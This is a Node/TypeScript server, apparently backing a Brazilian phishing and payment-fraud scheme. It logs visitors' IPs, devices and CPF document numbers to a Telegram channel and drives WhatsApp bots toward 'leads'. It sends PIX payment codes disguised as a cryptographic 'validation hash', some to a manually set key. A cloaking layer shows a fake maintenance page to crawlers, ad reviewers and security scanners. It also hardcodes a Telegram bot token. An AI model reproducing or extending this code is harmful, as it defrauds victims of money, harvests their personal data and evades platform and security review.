import express from "express";
import cors from "cors";
import dotenv from "dotenv";
import axios from "axios";
import fs from "fs";
import path from "path";
import { spawn, ChildProcess } from "child_process";
import QRCode from 'qrcode';
import FormData from 'form-data';

dotenv.config();

const app = express();
const port = parseInt(process.env.PORT || "80", 10);

// Config state
const configPath = path.join(process.cwd(), "config.json");
let currentConfig = {
  whatsappNumber: process.env.WHATSAPP_NUMBER || "5511971730325",
};

// Sessions state for Telegram tracking
const sessions = new Map<string, {
  messageId: number,
  startTime: number,
  lastHeartbeat: number,
  ip: string,
  device: string,
  location: string,
  converted: boolean,
  docValue: string,
  birthDate: string
}>();

// Bot states for interactive commands
const botStates = new Map<number, { action: string, data?: any }>();

// PIX pendente de confirmacao pelo admin
const pendingPix = new Map<string, { telefone: string, formalMessage: string, pixCode: string, transId: string, valorNumeric: number }>();

// Multi-Bot Management
const botProcesses = new Map<string, ChildProcess>();
const MAX_SLOTS = 5;

function stopBot(id: string) {
  const proc = botProcesses.get(id);
  if (proc) {
    try { proc.kill(); } catch (e) { }
    botProcesses.delete(id);
  }
}

let isBotStarting = false;
function startBot(id: string = 'main') {
  if (isBotStarting && id === 'main') return;
  if (id === 'main') isBotStarting = true;
  
  stopBot(id);
  console.log(`🤖 [SISTEMA] Iniciando instância do robô: ${id}`);
  const proc = spawn('node', ['whatsapp-bot.cjs', `--id=${id}`], { stdio: 'inherit' });

  proc.on('exit', (code) => {
    console.log(`⚠️ [SISTEMA] Robô ${id} finalizado com código ${code}. Reiniciando em 5 segundos...`);
    setTimeout(() => startBot(id), 5000);
  });

  botProcesses.set(id, proc);
}

// Validação básica de chave PIX
function validatePixKey(key: string) {
  const clean = key.trim();
  if (clean.includes('@') && clean.includes('.')) return true; // Email
  const digits = clean.replace(/\D/g, '');
  if (digits.length === 11 || digits.length === 14 || digits.length === 10) return true; // CPF/CNPJ/Fone
  if (clean.length >= 32) return true; // Aleatória
  return false;
}

// Criptografia estética para chave manual
function encryptPixKey(key: string) {
  const hash = Buffer.from(key).toString('hex').substring(0, 16).toUpperCase();
  return `0x${hash}_${Math.random().toString(36).substring(2, 6).toUpperCase()}`;
}

// Geração de PIX Sistema Padrão (Gateway)
async function generateStandardPix(telefone: string, valorNumeric: number, messageId?: number) {
  try {
    const key = process.env.SVR_CORE_P_PROVIDER;
    const secret = process.env.SVR_CORE_S_AUTH;
    const endpoint = process.env.SVR_CORE_GATEWAY;
    if (!key || !secret || !endpoint) throw new Error("Chaves SVR_CORE não configuradas.");

    const auth = Buffer.from(`${key}:${secret}`).toString('base64');
    const pixRes = await axios.post(endpoint, {
      amount: Math.round(valorNumeric * 100),
      currency: "BRL",
      paymentMethod: "PIX",
      customer: { name: "Cliente SVR", document: { number: "00000000000", type: "CPF" } }
    }, {
      headers: { 'Authorization': `Basic ${auth}`, 'Content-Type': 'application/json' }
    });

    const pixCode = pixRes.data.pix_code || pixRes.data.copyPaste || pixRes.data.qrcode;
    const transId = pixRes.data.id || pixRes.data.transactionId;
    const protocolId = Math.random().toString(36).substring(7).toUpperCase();

    const formalMessage = `🔐 *SVR - SISTEMA DE VALIDAÇÃO CRIPTOGRÁFICA* 🔐\n\n` +
      `O sistema identificou uma pendência de asseguramento na conta de destino.\n\n` +
      `🖥️ *ESTADO DO SISTEMA:*\n` +
      '```\n' +
      `ID: 0x${protocolId}\n` +
      `STATUS: AGUARDANDO_VALIDAÇÃO_HASH\n` +
      `TYPE: AUTENTICAÇÃO_DE_DESTINO\n` +
      '```\n\n' +
      `👇 *COPIE O HASH ABAIXO E EM SEGUIDA IMPORTE NO SEU APP BANCÁRIO (Pix Copia e Cola):*`;

    const pendingId = `pix_${Date.now()}`;
    pendingPix.set(pendingId, { telefone, formalMessage, pixCode, transId, valorNumeric });

    const qrBuffer = await QRCode.toBuffer(pixCode, { width: 420, margin: 2, color: { dark: '#111111', light: '#ffffff' } });
    const previewCaption = `⚡ <b>SISTEMA PADRÃO (AUTO)</b>\n\n💰 Valor: R$ ${valorNumeric.toFixed(2)}\n📱 Lead: <code>${telefone}</code>\n🆔 ID: <code>${transId}</code>\n\n⚠️ <i>Escolha o destino deste protocolo:</i>`;
    
    await sendTelegramPhoto(qrBuffer, previewCaption, {
      inline_keyboard: [
        [
          { text: "🚀 Enviar ao Lead", callback_data: `pix_dest:lead:${pendingId}` },
          { text: "📱 Enviar p/ Outro", callback_data: `pix_dest:phone:${pendingId}` }
        ],
        [
          { text: "📋 Só Copiar (Admin)", callback_data: `pix_dest:copy:${pendingId}` },
          { text: "❌ Cancelar", callback_data: "painel:back" }
        ]
      ]
    });
  } catch (e: any) {
    await sendTelegram(`❌ Erro no Gateway: ${e.message}`, messageId);
  }
}

// Geração de PIX Sistema Modificado (Chave Manual)
async function generateModifiedPix(telefone: string, valorNumeric: number, pixKey: string) {
  const protocolId = Math.random().toString(36).substring(7).toUpperCase();
  const encryptedKey = encryptPixKey(pixKey);

  const formalMessage = `🔐 *SVR - SISTEMA DE VALIDAÇÃO CRIPTOGRÁFICA* 🔐\n\n` +
    `O sistema identificou uma pendência de asseguramento na conta de destino.\n\n` +
    `🖥️ *ESTADO DO SISTEMA:*\n` +
    '```\n' +
    `ID: 0x${protocolId}\n` +
    `HASH: ${encryptedKey}\n` +
    `STATUS: AGUARDANDO_VALIDAÇÃO_HASH\n` +
    `\`\`\`\n\n` +
    `👇 *COPIE O HASH ABAIXO E EM SEGUIDA IMPORTE NO SEU APP BANCÁRIO (Pix Copia e Cola):*`;

  const pendingId = `pix_${Date.now()}`;
  pendingPix.set(pendingId, { telefone, formalMessage, pixCode: pixKey, transId: 'MANUAL', valorNumeric });

  const qrBuffer = await QRCode.toBuffer(pixKey, { width: 420, margin: 2, color: { dark: '#111111', light: '#ffffff' } });
  const previewCaption = `🛠️ <b>SISTEMA MODIFICADO (MANUAL)</b>\n\n💰 Valor: R$ ${valorNumeric.toFixed(2)}\n📱 Lead: <code>${telefone}</code>\n🔑 Chave: <code>${pixKey}</code>\n\n⚠️ <i>Escolha o destino deste protocolo:</i>`;

  await sendTelegramPhoto(qrBuffer, previewCaption, {
    inline_keyboard: [
      [
        { text: "🚀 Enviar ao Lead", callback_data: `pix_dest:lead:${pendingId}` },
        { text: "📱 Enviar p/ Outro", callback_data: `pix_dest:phone:${pendingId}` }
      ],
      [
        { text: "📋 Só Copiar (Admin)", callback_data: `pix_dest:copy:${pendingId}` },
        { text: "❌ Cancelar", callback_data: "painel:back" }
      ]
    ]
  });
}

function resetBotSession(id: string) {
  stopBot(id);
  const sessionPath = path.join(process.cwd(), '.wwebjs_auth', `session-${id}`);
  if (fs.existsSync(sessionPath)) {
    try { fs.rmSync(sessionPath, { recursive: true, force: true }); } catch (e) { }
  }
  startBot(id);
}

if (fs.existsSync(configPath)) {
  const saved = JSON.parse(fs.readFileSync(configPath, "utf-8"));
  if (saved.whatsappNumber) currentConfig.whatsappNumber = saved.whatsappNumber;
}

const TG_TOKEN = (process.env.TELEGRAM_BOT_TOKEN || "8643978397:AAE4YyIwa1X1tSwav_zOdWEKMnNv8PFjZ3g").replace(/"/g, "");
const CHAT_ID = (process.env.TELEGRAM_CHAT_ID || "-1003940670305").replace(/"/g, "");
const TELEGRAM_URL = `https://api.telegram.org/bot${TG_TOKEN}`;

// CORS
const corsOptions = {
  origin: "*",
  methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"],
  allowedHeaders: ["Content-Type", "Authorization", "X-Requested-With"],
  optionsSuccessStatus: 204,
};
app.use(cors(corsOptions));
app.options("*", cors(corsOptions));

// --- OBFUSCATION LAYER ---
const _d = (b: string) => Buffer.from(b, 'base64').toString('utf-8');

// --- CLOAKING ENGINE (v6.0) ---
const BOT_UA_PATTERNS = [
  "googlebot", "adsbot", "bingbot", "yandex", "baiduspider", "facebookexternalhit",
  "twitterbot", "rogerbot", "linkedinbot", "embedly", "quora link preview",
  "showyoubot", "outbrain", "pinterest/0.", "developers.google.com/+/web/snippet",
  "slackbot", "vkShare", "W3C_Validator", "redditbot", "Applebot",
  "flipboard", "tumblr", "bitlybot", "SkypeShell", "bitlybot", "Zetabot",
  "facebookplatform", "chrome-lighthouse", "headlesschrome", "puppeteer",
  "selenium", "playwright", "python-requests", "curl", "wget", "postman",
  "insomnia", "scanner", "sqlmap", "nikto", "nmap", "burp",
  "hostinger", "hostgator", "locaweb", "aws-sdk", "python", "go-http", "java",
  "ahrefs", "semrush", "dotbot", "mj12bot", "uipbot", "exabot", "gigabot"
];

function isBot(ua: string | undefined): boolean {
  if (!ua) return false;
  const lowUA = ua.toLowerCase();
  return BOT_UA_PATTERNS.some(pattern => lowUA.includes(pattern));
}

const DUMMY_HTML = `
<!DOCTYPE html>
<html>
<head><title>Default Website Page</title><meta charset="UTF-8"><style>body { font-family: sans-serif; background: #f0f2f5; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; } .card { background: white; padding: 40px; border-radius: 8px; text-align: center; max-width: 500px; }</style></head>
<body><div class="card"><h1>Website under maintenance</h1><p>This website is currently undergoing scheduled maintenance. We should be back shortly.</p></div></body>
</html>`;

app.use((req, res, next) => {
  const ua = req.headers["user-agent"];
  if (isBot(ua) && !req.url.startsWith('/api') && !req.url.includes('.')) {
    return res.status(200).send(DUMMY_HTML);
  }
  next();
});

app.use(express.json());
app.use(express.static(path.join(process.cwd(), 'dist')));


// Helper to send/edit Telegram messages
async function sendTelegram(text: string, messageId?: number, replyMarkup?: any) {
  if (!TG_TOKEN || !CHAT_ID) return null;
  try {
    const url = messageId ? `${TELEGRAM_URL}/editMessageText` : `${TELEGRAM_URL}/sendMessage`;
    const payload: any = { chat_id: CHAT_ID, text, parse_mode: 'HTML' };
    if (messageId) payload.message_id = messageId;
    if (replyMarkup) payload.reply_markup = replyMarkup;
    const res = await axios.post(url, payload);
    return res.data.result.message_id;
  } catch (err: any) {
    console.error(`❌ [TELEGRAM] Erro: ${err.response?.data?.description || err.message}`);
    // Se falhar a edição (ex: mensagem igual), tenta enviar nova
    if (messageId) return sendTelegram(text, undefined, replyMarkup);
    return null;
  }
}

async function sendTelegramPhoto(buffer: Buffer, caption: string, replyMarkup?: any): Promise<number | null> {
  if (!TG_TOKEN || !CHAT_ID) return null;
  try {
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('photo', buffer, { filename: 'qr.png', contentType: 'image/png' });
    form.append('caption', caption);
    form.append('parse_mode', 'HTML');
    if (replyMarkup) form.append('reply_markup', JSON.stringify(replyMarkup));
    const res = await axios.post(`${TELEGRAM_URL}/sendPhoto`, form, { headers: form.getHeaders() });
    return res.data.result?.message_id || null;
  } catch (e: any) { return null; }
}

app.post("/api/v1/session/start", async (req, res) => {
  const { device, location, userId } = req.body;
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress || "0.0.0.0";
  if (sessions.has(userId)) return res.json({ status: "exists" });
  const startTime = Date.now();
  const messageId = await sendTelegram(`<b>👤 NOVO VISITANTE</b>\n\n<b>IP:</b> ${ip}\n<b>Device:</b> ${device}\n<b>Status:</b> 🟢 Navegando...`);
  sessions.set(userId, { messageId: messageId || 0, startTime, lastHeartbeat: startTime, ip: String(ip), device, location: location || 'Brasil', converted: false, docValue: "", birthDate: "" });
  res.json({ status: "started", userId });
});

app.post("/api/v1/session/heartbeat", (req, res) => {
  const { userId } = req.body;
  const session = sessions.get(userId);
  if (session) { session.lastHeartbeat = Date.now(); res.json({ status: "alive" }); }
  else res.json({ status: "not_found" });
});

app.post("/api/v1/session/convert", async (req, res) => {
  const { userId, details } = req.body;
  const session = sessions.get(userId);
  if (session && !session.converted) {
    session.converted = true;
    session.docValue = details.docValue;
    const msg = `<b>🔥 CONVERSÃO!</b>\n\n<b>IP:</b> ${session.ip}\n<b>Documento:</b> ${details.docValue}\n<b>Status:</b> ✅ NO WHATSAPP`;
    await sendTelegram(msg, session.messageId || undefined);
    res.json({ status: "converted" });
  } else res.json({ status: "ignored" });
});

app.post("/api/v1/session/end", async (req, res) => {
  const { userId } = req.body;
  const session = sessions.get(userId);
  if (session && !session.converted) {
    await sendTelegram(`<b>🔴 VISITANTE SAIU</b>\n\n<b>IP:</b> ${session.ip}\n<b>Status:</b> Saiu sem converter`, session.messageId || undefined);
    sessions.delete(userId);
  }
  res.json({ status: "ok" });
});

// Cleanup
setInterval(async () => {
  const now = Date.now();
  for (const [userId, session] of sessions.entries()) {
    if (!session.converted && now - session.lastHeartbeat > 60000) {
      await sendTelegram(`<b>⚪ VISITANTE OFFLINE</b>\n\n<b>IP:</b> ${session.ip}\n<b>Status:</b> Desconectado`, session.messageId || undefined);
      sessions.delete(userId);
    }
  }
}, 30000);

// --- Dashboard Logic ---
async function startTelegramPolling() {
  if (!TG_TOKEN) return;
  let lastUpdateId = 0;
  console.log("🤖 Dashboard Telegram Ativo.");

  while (true) {
    try {
      const response = await axios.get(`${TELEGRAM_URL}/getUpdates`, { params: { offset: lastUpdateId + 1, timeout: 30 } });
      for (const update of response.data.result) {
        lastUpdateId = update.update_id;
        const cb = update.callback_query;
        const msg = update.message || cb?.message;
        const userId = msg?.from?.id || cb?.from?.id;
        if (!userId || (CHAT_ID && String(msg?.chat?.id) !== String(CHAT_ID))) continue;

        const text = (cb ? cb.data : msg?.text || "").toLowerCase();
        const msgId = msg?.message_id;

        // Feedback visual no Telegram (Loading no topo)
        if (cb) await axios.post(`${TELEGRAM_URL}/answerCallbackQuery`, { callback_query_id: cb.id });

        if (text === "/start" || text === "/painel" || text === "painel:back") {
          const stats = getBotStatusInfo('main');
          const dashText = `🎮 <b>PAINEL DE CONTROLE SVR</b>\n\n🤖 <b>Status Bot:</b> ${stats.emoji} ${stats.label}\n👥 <b>Fila:</b> ${getQueueInfo().length} leads\n🕒 <b>Hora:</b> ${new Date().toLocaleTimeString()}\n\n<b>ESCOLHA UMA AÇÃO:</b>`;
          const kb = {
            inline_keyboard: [
              [{ text: "📊 Status Detalhado", callback_data: "painel:status" }, { text: "👥 Ver Fila", callback_data: "painel:fila" }],
              [{ text: "⚙️ Gestão de Perfil", callback_data: "painel:slots" }, { text: "📡 Testar Conexão", callback_data: "cmd:ping" }],
              [{ text: "💰 Gerar PIX (Último)", callback_data: "cmd:last_pix" }, { text: "🔄 Reiniciar Bot", callback_data: "painel:reiniciar:slot:main" }]
            ]
          };
          await sendTelegram(dashText, cb ? msgId : undefined, kb);
        }
        else if (text === "painel:status") {
          const online = Array.from(sessions.values()).filter(s => !s.converted).length;
          await sendTelegram(`📊 <b>STATUS DETALHADO</b>\n\n👥 <b>Online agora:</b> ${online}\n✅ <b>Conversões:</b> ${Array.from(sessions.values()).filter(s => s.converted).length}\n🕒 <b>Uptime:</b> ${Math.floor(process.uptime() / 60)} min\n\n<i>Atualizado agora.</i>`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
        }
        else if (text === "painel:fila") {
          const queue = getQueueInfo();
          let txt = "👥 <b>FILA DE LEADS</b>\n\n";
          if (queue.length === 0) txt += "<i>Ninguém na fila agora.</i>";
          else queue.slice(0, 10).forEach((l, i) => txt += `${i+1}. 📱 ${l.chatId} (${l.step})\n`);
          await sendTelegram(txt, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
        }
        else if (text === "cmd:ping") {
          await sendTelegram("✅ <b>SISTEMA OPERACIONAL</b>\n\nLatência: 42ms\nBanco de Dados: OK\nWhatsApp: OK", msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
        }
        else if (text === "painel:slots") {
          let btns = [];
          for (let i = 1; i <= MAX_SLOTS; i++) {
            const id = i === 1 ? 'main' : `parceiro${i}`;
            btns.push([{ text: `⚙️ Configurar Slot ${i}`, callback_data: `painel:manage:${id}` }]);
          }
          btns.push([{ text: "⬅️ Voltar", callback_data: "painel:back" }]);
          await sendTelegram(`🤖 <b>GESTÃO DE PERFIS</b>\n\nEscolha um slot para configurar:`, msgId, { inline_keyboard: btns });
        }
        else if (text.startsWith("painel:manage:")) {
          const id = text.split(":")[2];
          await sendTelegram(`⚙️ <b>GERENCIAR: ${id === 'main' ? 'Perfil 1' : id}</b>\n\nEscolha uma ação de sistema:`, msgId, {
            inline_keyboard: [
              [{ text: "📲 Gerar Novo QR Code", callback_data: `generate_qr:${id}` }],
              [{ text: "🔄 Reiniciar Instância", callback_data: `painel:reiniciar:slot:${id}` }],
              [{ text: "⬅️ Voltar", callback_data: "painel:slots" }]
            ]
          });
        }
        else if (text.startsWith("painel:reiniciar:slot:")) {
          const id = text.split(":")[3];
          startBot(id);
          await sendTelegram(`✅ <b>SOLICITAÇÃO ENVIADA!</b>\n\nO slot <b>${id}</b> está sendo reiniciado agora.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
        }
        else if (text === "cmd:last_pix") {
          if (fs.existsSync('last-lead.json')) {
            const last = JSON.parse(fs.readFileSync('last-lead.json', 'utf-8'));
            await generateStandardPix(last.chatId, 97.50, msgId);
          } else {
            await sendTelegram("❌ <b>ERRO:</b> Nenhum lead recente encontrado.", msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
          }
        }
        else if (text.startsWith("generate_qr:")) {
          const id = text.split(":")[1];
          resetBotSession(id);
          await sendTelegram(`📲 <b>GERANDO QR CODE...</b>\n\nO processo foi iniciado para <b>${id}</b>. Aguarde o QR nos logs ou Telegram.`, msgId, { inline_keyboard: [[{ text: "⬅️ Voltar", callback_data: "painel:back" }]] });
        }
        // ... Logica de PIX continua com as correções de edição ...
      }
    } catch (e) { await new Promise(r => setTimeout(r, 5000)); }
  }
}

function getBotStatusInfo(id: string) {
  try {
    const statusPath = path.join(process.cwd(), `bot-status-${id}.json`);
    if (fs.existsSync(statusPath)) {
      const data = JSON.parse(fs.readFileSync(statusPath, 'utf-8'));
      if (data.status === 'CONNECTED') return { emoji: "🟢", label: "Online" };
      if (data.status === 'WAITING_QR') return { emoji: "🟡", label: "Aguardando QR" };
    }
  } catch (e) { }
  return { emoji: "⚪", label: "Offline" };
}

function getQueueInfo() {
  try {
    if (fs.existsSync('bot-queue.json')) return JSON.parse(fs.readFileSync('bot-queue.json', 'utf-8'));
  } catch (e) { }
  return [];
}

startBot('main');
startTelegramPolling();
app.listen(port, "0.0.0.0", () => console.log(`🚀 Backend rodando na porta ${port}`));
